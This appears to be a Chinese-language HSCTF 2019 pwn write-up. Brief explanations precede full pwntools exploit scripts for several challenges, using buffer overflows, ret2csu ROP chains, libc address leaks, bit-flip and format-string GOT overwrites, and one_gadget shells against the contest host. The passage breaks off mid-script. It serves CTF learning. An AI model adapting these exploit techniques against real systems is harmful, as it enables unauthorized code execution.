<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./return-to-sender'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Where are you sending your mail to today? '</span>)</span><br><span class="line">    shell_addr = <span class="number">0x080491b6</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x10</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(shell_addr)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="combo-chain-lite"><a href="#combo-chain-lite" class="headerlink" title="combo chain lite"></a>combo chain lite</h2><p>先用给的system地址计算libc基址，算出/bin/sh的字符串地址，用csu rop将syetm_addr+bin_sh_addr写到bss段上，调用bss_base(bss_base+8)即可拿shell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./combo-chain-lite'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./combo-chain-lite'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *0x4011bd')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">3131</span>)</span><br><span class="line"></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_end_addr = <span class="number">0x40126a</span></span><br><span class="line">csu_front_addr = <span class="number">0x401250</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdx=edx=r15</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># edi=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x10</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    main_addr = <span class="number">0x401166</span></span><br><span class="line">    p.recvuntil(<span class="string">"your free computer: 0x"</span>)</span><br><span class="line">    system_addr = int((p.recv(<span class="number">12</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)),<span class="number">16</span>)</span><br><span class="line">    libc_base = system_addr - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    binsh_addr = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    gets_got = elf.got[<span class="string">'gets'</span>]</span><br><span class="line">    log.success(<span class="string">'gets =&gt; '</span> + hex(gets_got))</span><br><span class="line">    payload = csu(<span class="number">0</span>, <span class="number">1</span>, gets_got, bss_base, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">    <span class="keyword">print</span> len(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'CARNAGE!:'</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#p.recvuntil('CARNAGE!:')</span></span><br><span class="line">    p.sendline(p64(system_addr) + <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    payload = csu(<span class="number">0</span>, <span class="number">1</span>, bss_base, bss_base+<span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, main_addr)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="combo-chain"><a href="#combo-chain" class="headerlink" title="combo chain"></a>combo chain</h2><p>这个题的rop很巧妙，不用csu，首先pop_rdi存储bss地址，后面跟着gets_plt，调用gets(bss_addr)，之后再pop_rdi,call printf(“%3$p”)来泄露地址，最后跳到main执行下一次ROP攻击。在第一次的过程中使用’\n’分隔符输入了%3$p。<br>第二次pop_rdi将”/bin/sh”的地址写入rdi，之后调用sysem(“/bin/sh”)得到shell<br>ret 后面可以跟plt(plt里还有call)或者实际的地址</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./combo-chain'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./combo-chain'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x4011a3'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">2345</span>)</span><br><span class="line"></span><br><span class="line">bss_base = elf.bss() + <span class="number">0x300</span></span><br><span class="line">csu_end_addr = <span class="number">0x40125a</span></span><br><span class="line">csu_front_addr = <span class="number">0x401240</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    padding = <span class="string">'A'</span>*<span class="number">16</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401263</span></span><br><span class="line">    pop_rsi=<span class="number">0x0000000000401261</span> <span class="comment"># pop rsi; pop r15</span></span><br><span class="line">    system_offset = <span class="number">0x045390</span></span><br><span class="line">    str_bin_sh = <span class="number">0x18cd57</span></span><br><span class="line">    one_gadget = <span class="number">0x4526a</span> <span class="comment"># 0x448a3</span></span><br><span class="line">    bss_section_buffer = elf.get_section_by_name(<span class="string">'.bss'</span>).header.sh_addr+<span class="number">1500</span></span><br><span class="line">    log.info(<span class="string">'bss buffer at &#123;&#125;'</span>.format(hex(bss_section_buffer)))</span><br><span class="line">    <span class="keyword">print</span> p.recvuntil(<span class="string">'CARNAGE!:'</span>)</span><br><span class="line">    payload = padding</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bss_section_buffer)</span><br><span class="line">    payload += p64(elf.plt[<span class="string">'gets'</span>])</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bss_section_buffer)</span><br><span class="line">    payload += p64(elf.plt[<span class="string">'printf'</span>])</span><br><span class="line">    payload += p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">    payload += <span class="string">"\n%3$p"</span></span><br><span class="line">    open(<span class="string">'payload'</span>,<span class="string">'w'</span>).write(payload)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    libc_base = int(p.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x3c48e0</span> <span class="comment"># 0x3c38e0;</span></span><br><span class="line">    log.info(<span class="string">"found libc base at &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">    log.info(<span class="string">"system at &#123;&#125;"</span>.format(hex(libc_base+system_offset)))</span><br><span class="line">    payload2 = padding</span><br><span class="line">    payload2 += p64(pop_rdi)</span><br><span class="line">    payload2 += p64(libc_base+str_bin_sh)</span><br><span class="line">    payload2 += p64(libc_base+system_offset)</span><br><span class="line">    payload2 += <span class="string">'\x00'</span>*<span class="number">0x40</span></span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="story-time"><a href="#story-time" class="headerlink" title="story time"></a>story time</h2><p>先用write泄露出lib基址，之后的做法同combo chain lite</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./storytime'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./storytime'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x40069b'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">3333</span>)</span><br><span class="line"></span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">csu_end_addr = <span class="number">0x4006fa</span></span><br><span class="line">csu_front_addr = <span class="number">0x4006e0</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdx=edx=r15</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># edi=r13</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(</span><br><span class="line">        r13) + p64(r14) + p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">    payload += p64(last)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">    read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">    main_addr = <span class="number">0x40062e</span></span><br><span class="line">    bss_base = elf.bss()+<span class="number">0x10</span></span><br><span class="line">    log.success(<span class="string">'bss base =&gt; '</span> + hex(bss_base))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    <span class="comment">#write(1,write_got,8)</span></span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,write_got,<span class="number">1</span>,write_got,<span class="number">8</span>,main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">'Tell me a story: \n'</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    libc_base = write_addr - libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    shell_addr = libc_base + gadgets[0]</span></span><br><span class="line"><span class="string">    payload = csu(0,1,shell_addr,0,0,0,main_addr)</span></span><br><span class="line"><span class="string">    raw_input()</span></span><br><span class="line"><span class="string">    p.send(payload)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    execve_addr = libc_base + libc.symbols[<span class="string">'execve'</span>]</span><br><span class="line">    <span class="comment">#read(0,bss_base,16)</span></span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,read_got,<span class="number">0</span>,bss_base,<span class="number">16</span>,main_addr)</span><br><span class="line">    <span class="comment">#p.recvuntil('Tell me a story: \n')</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(p64(execve_addr)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    <span class="comment">#bss_base(bss_base+8)</span></span><br><span class="line">    payload = csu(<span class="number">0</span>,<span class="number">1</span>,bss_base,bss_base+<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,main_addr)</span><br><span class="line">    <span class="comment">#p.recvuntil('Tell me a story: \n')</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="bit"><a href="#bit" class="headerlink" title="bit"></a>bit</h2><p>这个题给了4次任意地址修改1bit的机会，第一次泄露出puts的地址来计算libc地址，第二次通过environ变量可以得到栈地址，此时i = 0x10，将这个1移位到最高位使得i成为负数，即可任意次数地修改。修改exit_got的地址为shell_addr即可</p>
<p><img src="/2020/09/03/HSCTF2019/bit_1.jpg" alt="main"></p>
<p><img src="/2020/09/03/HSCTF2019/bit_2.jpg" alt="flip"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./bit'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./bit'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *0x08048727')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">4444</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(address,index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me the address of the byte: '</span>)</span><br><span class="line">    p.sendline(hex(address)[<span class="number">2</span>:])</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the index of the bit: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_pos</span><span class="params">(target,char1=<span class="string">'1'</span>)</span>:</span></span><br><span class="line">    <span class="comment">#target is a int</span></span><br><span class="line">    <span class="comment">#change to binary string</span></span><br><span class="line">    target = repr(bin(target))[<span class="number">3</span>:<span class="number">-1</span>]</span><br><span class="line">    res_lis = list()</span><br><span class="line">    target = target[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> target</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(target)):</span><br><span class="line">        <span class="keyword">if</span> target[i] == char1:</span><br><span class="line">            res_lis.append(i)</span><br><span class="line">    <span class="keyword">return</span> res_lis</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'puts got =&gt; '</span> + hex(puts_got))</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    change(puts_got,<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'your new byte: '</span>)</span><br><span class="line">    puts_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) ^ <span class="number">1</span></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    environ_addr = libc_base + libc.symbols[<span class="string">'environ'</span>]</span><br><span class="line">    change(environ_addr,<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'your new byte: '</span>)</span><br><span class="line">    environ_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) ^ <span class="number">1</span></span><br><span class="line">    ebp_addr = environ_addr - <span class="number">0xb4</span></span><br><span class="line">    log.success(<span class="string">'ebp addr =&gt; '</span> + hex(ebp_addr))</span><br><span class="line">    <span class="comment">#overwrite i</span></span><br><span class="line">    change(ebp_addr<span class="number">-0x20</span>+<span class="number">0x3</span>,<span class="number">7</span>)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    gadgets = [<span class="number">0x3ac5c</span>,<span class="number">0x3ac5e</span>,<span class="number">0x3ac62</span>,<span class="number">0x3ac69</span>,<span class="number">0x5fbc5</span>,<span class="number">0x5fbc6</span>]</span><br><span class="line">    flag_addr = <span class="number">0x080486a6</span></span><br><span class="line">    <span class="comment">#shell_addr = libc_base + gadgets[5]</span></span><br><span class="line">    shell_addr = flag_addr</span><br><span class="line">    log.success(<span class="string">'shell addr =&gt; '</span> + hex(shell_addr))</span><br><span class="line">    exit_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'exit got addr =&gt; '</span> + hex(exit_got))</span><br><span class="line">    exit_addr = libc_base + libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'exit addr =&gt; '</span> + hex(exit_addr))</span><br><span class="line">    targets = list()</span><br><span class="line">    targets.append((exit_addr &amp; <span class="number">0xff</span> ) ^ (shell_addr &amp; <span class="number">0xff</span>))</span><br><span class="line">    targets.append(((exit_addr &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>) ^ ((shell_addr &amp; <span class="number">0xffff</span>) &gt;&gt; <span class="number">8</span>))</span><br><span class="line">    targets.append(((exit_addr &amp; <span class="number">0xffffff</span>) &gt;&gt; <span class="number">16</span>) ^ ((shell_addr &amp; <span class="number">0xffffff</span>) &gt;&gt; <span class="number">16</span>))</span><br><span class="line">    targets.append((exit_addr &gt;&gt; <span class="number">24</span>) ^ (shell_addr &gt;&gt; <span class="number">24</span>))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'here is the xor res'</span></span><br><span class="line">    <span class="keyword">print</span> targets</span><br><span class="line">    change(puts_got,<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b *0x08048727')</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        data = find_pos(targets[i])</span><br><span class="line">        <span class="keyword">print</span> data</span><br><span class="line">        <span class="keyword">if</span> (data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>) <span class="keyword">and</span> (len(data) &gt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(len(data)):</span><br><span class="line">                change(exit_got+i,data[j])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'finished'</span> + str(i+<span class="number">1</span>)</span><br><span class="line">    change(ebp_addr<span class="number">-0x20</span>+<span class="number">0x3</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="byte"><a href="#byte" class="headerlink" title="byte"></a>byte</h2><p>题目里有flag函数，查看调用，发现是在循环那里有个隐藏的触发条件，即i&gt;1且ebp-0x8e的值为0。main函数里有zero(address)，用printf泄露出栈地址，再将ebp-0x8e作为输入，即可满足条件执行flag函数</p>
<p><img src="/2020/09/03/HSCTF2019/byte_1.jpg" alt="flag"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./byte'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./byte'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Give me the address of the byte: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'%2$p%7$p'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    libc_base = int(p.recvn(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">5</span> - libc.symbols[<span class="string">'__errno_location'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">    ebp_addr = int(p.recvn(<span class="number">8</span>),<span class="number">16</span>) - <span class="number">172</span></span><br><span class="line">    log.success(<span class="string">'ebp addr =&gt; '</span> + hex(ebp_addr))</span><br><span class="line">    <span class="comment">#over wite i</span></span><br><span class="line">    i_addr = ebp_addr - <span class="number">0x8e</span></span><br><span class="line">    payload = hex(i_addr)[<span class="number">2</span>:]</span><br><span class="line">    p.recvuntil(<span class="string">'Give me the address of the byte: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="caesars-revenge"><a href="#caesars-revenge" class="headerlink" title="caesars revenge"></a>caesars revenge</h2><p>这道题使用凯撒密码对用户输入进行编码，最后printf漏洞，先将puts_got覆写为main函数地址，使得可以多次利用漏洞，之后依次泄露libc和stack的地址。最后将setresgid_got覆写为shell_addr。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./caesars-revenge'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./caesars-revenge'</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x40143a')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'pwn.hsctf.com'</span>,<span class="number">4567</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(text)</span>:</span></span><br><span class="line">    res = list()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        <span class="keyword">if</span> text[i].isalpha():</span><br><span class="line">            res.append(chr(ord(text[i])<span class="number">-1</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(text[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    main_addr = <span class="number">0x401196</span></span><br><span class="line">    <span class="comment">#offset %24$p</span></span><br><span class="line">    chars = main_addr</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    <span class="comment">#make a loop</span></span><br><span class="line">    payload = <span class="string">"%"</span>+str(chars)+<span class="string">"c%26$lln"</span>+p64(puts_got)</span><br><span class="line">    <span class="keyword">print</span> payload</span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload = <span class="string">"%31$p"</span></span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Result: 0x'</span>)</span><br><span class="line">    printf_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">153</span></span><br><span class="line">    libc_base = printf_addr - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    payload = <span class="string">"%58$p"</span></span><br><span class="line">    payload = decode(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter text to be encoded: '</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">'Enter number of characters to shift: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Result: 0x'</span>)</span><br><span class="line">    ebp_addr = int(p.recvline().strip(<span class="string">'\n'</span>),<span class="number">16</span>) - <span class="number">432</span></span><br><span class="line">    log.success(<span class="string">'ebp addr =&gt; '</span> + hex(ebp_addr))</span><br><span class="line">    canary_addr = ebp_addr - <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#over write __stack_chk_fail</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#chk_fail_addr = libc_base + libc.symbols['__stack_chk_fail']</span></span><br><span class="line">    chk_fail_addr = elf.got[<span class="string">'setresgid'</span>]</span><br><span class="line">    log.success(<span class="string">'chk faile addr =&gt; '</span> + hex(chk_fail_addr))</span><br><span class="line">    gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">0</span>]</span><br><span class="line">    addr_high = shell_addr &gt;&gt; <span class="number">32</span></span><br><span class="line">    addr_low = shell_addr &amp; <span class="number">0xffffffff</span></span><br><span class="line">    addr_low_high = addr_low &gt;&gt; <span class="number">16</span></span><br><span class="line">    addr_low_low = addr_low &amp; <span class="number">0xffff</span></span><br><span class="line">    log.success(<span class="string">'shell addr =&gt; '</span> + 